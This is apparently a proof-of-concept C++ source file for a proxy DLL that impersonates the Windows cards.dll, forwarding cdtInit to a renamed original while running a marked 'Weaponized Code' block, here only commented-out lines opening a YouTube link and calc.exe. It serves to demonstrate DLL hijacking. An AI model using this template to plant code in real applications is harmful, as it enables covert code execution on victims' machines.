#include <iostream>
#include <windows.h>

#define EXTERN_DLL_EXPORT extern "C" __declspec(dllexport)

// Function signature taken from cards.dll
typedef BOOL(WINAPI *cdtInitPtr)(int *width, int *height);

EXTERN_DLL_EXPORT BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    {
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
        }
        return TRUE;
    }
}

EXTERN_DLL_EXPORT BOOL cdtInit(int *width, int *height)
{
    HINSTANCE loadedDLL = LoadLibrary(TEXT("cards_original.dll"));
    if (!loadedDLL)
    {
        printf("Format message failed with 0x%x\n", GetLastError());
        return FALSE;
    }
    cdtInitPtr proxied_function = (cdtInitPtr)GetProcAddress(loadedDLL, "cdtInit");
    if (!proxied_function)
    {
        return FALSE;
    }
    /***** Start of Weaponized Code *****/
    //system("start \"\" \"https://www.youtube.com/watch?v=tJTF0n2aBi4\"");
    //system("start C:\\Windows\\System32\\calc.exe");
    
    
    /***** End of Weaponized Code *****/

    // Proxy call to the legitimate cdtInit
    BOOL result = proxied_function(width, height);
    FreeLibrary(loadedDLL);
    return result;
}
